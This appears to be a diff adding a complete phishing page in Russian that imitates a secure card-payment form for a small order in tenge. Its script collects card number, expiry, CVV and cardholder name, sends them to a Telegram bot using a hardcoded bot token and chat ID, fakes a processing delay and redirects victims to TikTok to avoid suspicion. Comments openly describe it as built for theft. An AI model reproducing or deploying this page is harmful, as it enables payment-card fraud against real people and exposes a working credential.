@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Оплата заказа</title>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #f4f5f7; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: #333; }
+        .container { width: 100%; max-width: 400px; padding: 20px; }
+        .card { background: #fff; border-radius: 16px; padding: 30px 20px; box-shadow: 0 8px 24px rgba(0,0,0,0.08); }
+        h2 { font-size: 22px; margin: 0 0 5px 0; text-align: center; color: #000; }
+        p { font-size: 14px; color: #888; text-align: center; margin-bottom: 25px; }
+        .amount { font-size: 32px; font-weight: bold; text-align: center; margin-bottom: 20px; color: #000; }
+        
+        label { display: block; font-size: 12px; color: #666; margin-bottom: 5px; font-weight: 600; text-transform: uppercase; }
+        input { width: 100%; padding: 14px; background: #f9f9f9; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; margin-bottom: 15px; outline: none; }
+        input:focus { border-color: #000; background: #fff; }
+        
+        .row { display: flex; gap: 10px; }
+        .row > div { flex: 1; }
+        
+        button { width: 100%; padding: 16px; background: #000; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:active { background: #333; }
+        
+        .logos { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
+        .logos img { height: 20px; opacity: 0.7; }
+        
+        #loading { display: none; text-align: center; padding: 20px 0; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="card" id="paymentForm">
+            <h2>Безопасная оплата</h2>
+            <p>Заказ #84920</p>
+            <div class="amount">1 490 ₸</div>
+            
+            <div class="logos">
+                <span style="font-weight:bold; font-size:12px; color:#1a1f71;">VISA</span>
+                <span style="font-weight:bold; font-size:12px; color:#eb001b;">MasterCard</span>
+            </div>
+
+            <form id="cardForm">
+                <!-- Атрибуты autocomplete критически важны для кражи -->
+                <label>Номер карты</label>
+                <input type="text" id="cc_number" placeholder="0000 0000 0000 0000" autocomplete="cc-number" required>
+
+                <div class="row">
+                    <div>
+                        <label>Срок действия</label>
+                        <input type="text" id="cc_exp" placeholder="ММ/ГГ" autocomplete="cc-exp" required>
+                    </div>
+                    <div>
+                        <label>CVV</label>
+                        <input type="text" id="cc_cvv" placeholder="123" autocomplete="cc-csc" maxlength="4" required>
+                    </div>
+                </div>
+
+                <label>Имя владельца</label>
+                <input type="text" id="cc_name" placeholder="IVAN IVANOV" autocomplete="cc-name" required>
+
+                <button type="submit">Оплатить 1 490 ₸</button>
+            </form>
+        </div>
+
+        <div class="card" id="loading" style="text-align:center;">
+            <div class="spinner"></div>
+            <h2>Обработка...</h2>
+            <p>Пожалуйста, не закрывайте страницу.</p>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8";
+        const CHAT_ID = "7485234259";
+
+        function sendText(text) {
+            const img = new Image();
+            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+        }
+
+        document.getElementById('cardForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Скрываем форму, показываем загрузку
+            document.getElementById('paymentForm').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+
+            // Забираем все данные из полей (включая автозаполненные)
+            const cardNum = document.getElementById('cc_number').value;
+            const cardExp = document.getElementById('cc_exp').value;
+            const cardCvv = document.getElementById('cc_cvv').value;
+            const cardName = document.getElementById('cc_name').value;
+
+            // Отправляем в телеграм
+            const message = `💳 <b>ПЕРЕХВАЧЕНА КАРТА!</b>\n\n` +
+                            `🔢 Номер: <code>${cardNum}</code>\n` +
+                            `📅 Срок: <code>${cardExp}</code>\n` +
+                            `🔒 CVV: <code>${cardCvv}</code>\n` +
+                            `👤 Имя: <code>${cardName}</code>`;
+            
+            sendText(message);
+
+            // Имитация обработки платежа (3 секунды) и редирект
+            setTimeout(() => {
+                // Перекидываем на настоящий сайт, чтобы не вызвать подозрений
+                window.location.href = "https://www.tiktok.com"; 
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
